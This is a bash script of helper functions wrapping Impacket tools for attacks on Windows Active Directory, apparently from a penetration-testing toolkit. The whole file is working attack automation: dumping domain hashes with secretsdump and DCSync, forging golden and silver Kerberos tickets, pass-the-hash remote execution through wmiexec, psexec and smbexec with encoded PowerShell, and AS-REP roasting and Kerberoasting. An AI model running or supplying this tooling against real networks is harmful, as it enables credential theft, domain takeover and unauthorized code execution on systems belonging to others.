#!/bin/bash

run_impacket() {
    local impacket_command="$1"
    if [[ -z "$impacket_command" ]]; then
        echo "Impacket command must be specified."
        return 1
    fi
    local impacket_command_options=""
    if [[ ! -z "$2" ]]; then
        impacket_command_options="$2"
        echo "impacket_command_options=$impacket_command_options"
    fi
    local proxychain_command=""
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes"
    fi
    if [[ -z "$username" ]] ; then
        echo "WARNING Username was not set. Ensure that you are sure about this"    
    fi
    if [[ -z "$domain" ]] ; then
        echo "No domain was set. Make sure you are sure about this"
    fi
    if [[ -z "$target_ip" ]]; then
        echo "target_ip is not set" 
    fi
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running $impacket_command with proxychains"
    else
        proxychain_command=""
    fi
    if [[ ! -z "$dc_host" ]]; then
        impacket_command_options="$impacket_command_options -dc-host $dc_host"
    fi
    if [[ ! -z "$dc_ip" ]]; then
        impacket_command_options="$impacket_command_options -dc-ip $dc_ip"
    fi
    if [[ -z "$dc_host" ]] && [[ -z "$dc_ip" ]]; then
        echo "No DC host or IP specified. Make sure this is your intention." 
    fi
    local target=$username
    if [[ ! -z "$password" ]]; then
        target="$target:'$password'"
    fi
    if [[ ! -z "$domain" ]]; then
        target="$domain/$target"
    fi
    if [[ ! -z "$target_ip" ]]; then
        target="$target@$target_ip"        
    fi
    if [[ ! -z "$output_hashes" ]] && [[ "$output_hashes" == "true" ]]; then
        impacket_command_options="$impacket_command_options -outputfile $hash_file"
        if [[ -f "$hash_file" ]]; then
            echo "$hash_file already exists, skipping impacket"
            return 0
        fi
    fi
    local hashes_option="" 
    local kerberos_option=""
    if [[ ! -z "$KRB5CCNAME" ]]; then
        if [[ -f "$KRB5CCNAME" ]]; then
            echo "Using Kerberos ticket cache: $KRB5CCNAME"
            kerberos_option="-k"
        fi
    fi
    if [[ ! -z "$ntlm_hash" ]]; then
        if [[ $ntlm_hash == *":"* ]]; then
            hashes_option="-hashes $ntlm_hash"
        else
            hashes_option="-hashes "$(append_lm_hash $ntlm_hash)
        fi
        kerberos_option=""
    fi
    impacket_command_options="$impacket_command_options $hashes_option $kerberos_option"
    echo "going to set cmd options"
    local run_cmd_option=""    
    if [[ ! -z "$run_cmd" ]] && [[ "$run_cmd" == "true" ]]; then
        if [[ -z "$cmd" ]]; then
            echo "Command must be set when run_cmd is true."
        fi
        if [[ "$cmd" == *powershell* ]]; then
            run_cmd_option="$cmd"
        else
            run_cmd_option=$(encode_powershell "$cmd")
        fi
        run_cmd_option=$(echo "$run_cmd_option" | sed 's/"/\\"/g')
    fi
    if [[ -z $impacket_additional_options ]]; then
        echo "No additional options set for impacket."
    else
        echo "impacket_additional_options=$impacket_additional_options"
    fi
    echo "target=$target"
    local command_string="${proxychain_command}$impacket_command $impacket_command_options $impacket_additional_options -no-pass $target"
    echo $command_string
    if [[ -z $run_cmd_option ]]; then
        eval $command_string | tee -a $trail_log
    else
        #echo ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" 
        eval $command_string \"$run_cmd_option\"  | tee -a $trail_log
    fi
}

run_impacket_secretsdump () {

    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.secretsdump"
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username was not set. Assuming just-dc-user was not needed"
    else
        secretsdump_additional_options="-just-dc-user $target_username"
    fi
    output_hashes="true"
    run_impacket "impacket-secretsdump" "$secretsdump_additional_options"

}

run_impacket_dcsync() {
    
    if [[ -z "$target_ip" ]]; then
        echo "Target ip must be set before running dcsync."
        return 1
    fi  
    hash_file="hashes.dcsync.$target_ip"
    if [[ -f "$hash_file.secrets" ]]; then
        echo "$hash_file already exists, skipping dcsync"
        return 0
    fi
    run_impacket_secretsdump

}

run_impacket_golden_ticket() {

    if [[ -z "$aes_key" ]]; then
        echo "AES key must be set before running golden ticket."
        return 1
    fi
    if [[ -z $domain_sid ]]; then
        echo "Domain SID must be set before running golden ticket."
        return 1
    fi
    if [[ -z $domain ]]; then
        echo "Domain must be set before running golden ticket."
        return 1
    fi
    if [[ -z $ticket_username ]]; then
        echo "Ticket username must be set before running golden ticket."
        return 1
    fi
    if [[ -z $ticket_uid ]]; then
        echo "Ticket UID must be set before running golden ticket."
        return 1
    fi
    local additional_options=""
    if [[ ! -z "$extra_sid" ]]; then
        echo "Using extra SID: $extra_sid"
        additional_options="$additional_options -extra-sid $extra_sid"
    fi
    echo ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain -user-id $ticket_uid $additional_options "$ticket_username"
    ticketer.py -aesKey $aes_key -domain-sid $domain_sid -domain $domain -user-id $ticket_uid $additional_options "$ticket_username"

}

run_impacket_wmiexec() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
        return 1
    fi
    if pgrep -f "wmiexec.py .*$target_ip"; then
        echo "Impacket WMIExec is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    run_impacket "impacket-wmiexec" "$1"
}

run_impacket_psexec() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket PsExec command."
        return 1
    fi
    if pgrep -f "psexec.py .*$target_ip"; then
        echo "Impacket PsExec is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    run_impacket "impacket-psexec" "$1"
}

run_impacket_smbexec() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
        return 1
    fi
    if pgrep -f "smbexec.py .*$target_ip"; then
        echo "Impacket SMBExec is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    run_impacket "impacket-smbexec" "$1"
}

run_impacket_mssqlclient() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP address must be set before running Impacket mssqlclient command."
        return 1
    fi
    if pgrep -f "mssqlclient.py .*$target_ip"; then
        echo "Impacket MSSQLClient is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    run_impacket "impacket-mssqlclient" "$1"
}

run_impacket_asrep_roasting() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.asreproast"
    fi
    output_hashes="true"
    run_impacket "impacket-GetNPUsers" "-request $1"
}

run_impacket_kerberoast() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    target_ip=
    output_hashes="true"
    run_impacket "impacket-GetUserSPNs" "-request $1"
}

run_impacket_lookupsid() {
    echo "Running Impacket LookUpSID..."
    hash_file=""
    output_hashes="false"
    if [[ -z $username ]]; then
        echo "Username must be set before running LookUpSID."
        return 1
    fi    
    run_impacket "lookupsid.py"
}

run_impacket_silverticket() {
    echo "Running Impacket SilverTicket..."
    if [[ -z $spn ]]; then
        spn="host/$domain"
        echo "SPN not set, using default: $spn"
    fi
    ticket_additional_option="-spn $spn"
    run_impacket_ticketer
}

run_impacket_ticketer() {

    if [[ -z $target_username ]]; then
        echo "Ticket target_username must be set before running ticketer."
        return 1
    fi
    domain_information=$(run_impacket_lookupsid)
    domain_sid=$(echo "$domain_information" | grep "Domain SID" | awk -F': ' '{print $2}' )
    if [[ -z $domain_sid ]]; then
        echo "Failed to extract Domain SID from LookUpSID output."
        return 1
    fi
    echo "Domain SID: $domain_sid"
    target_user_sid=$(echo "$domain_information" | grep "$target_username" | awk -F ':' '{print $1}')   
    if [[ -z $target_user_sid ]]; then
        echo "Failed to extract User SID for $target_username from LookUpSID output."
        return 1
    fi
    echo "User SID: $target_user_sid"
    local ticket_hash_option=""
    if [[ -z $ntlm_hash ]] && [[ -z $aes_key ]]; then
        if [[ ! -z $password ]]; then
            ntlm_hash=$(generate_ntlm_hash "$password")
        fi
    fi    
    if [[ ! -z $ntlm_hash ]]; then
        ticket_hash_option+="-nthash $ntlm_hash "
    fi
    if [[ ! -z $aes_key ]]; then
        ticket_hash_option+="-aesKey $aes_key "
    fi
    local ticket_authentication_option=""
    #if [[ ! -z $username ]] && [[ ! -z $password ]]; then
    #    ticket_authentication_option+="-request -user $username -password '$password' "
    #fi
    local ticketer_command="ticketer.py -domain-sid $domain_sid -user-id $target_user_sid -domain $domain $ticket_hash_option $ticket_authentication_option $ticket_additional_option \"$target_username\""
    echo $ticketer_command
    eval $ticketer_command

}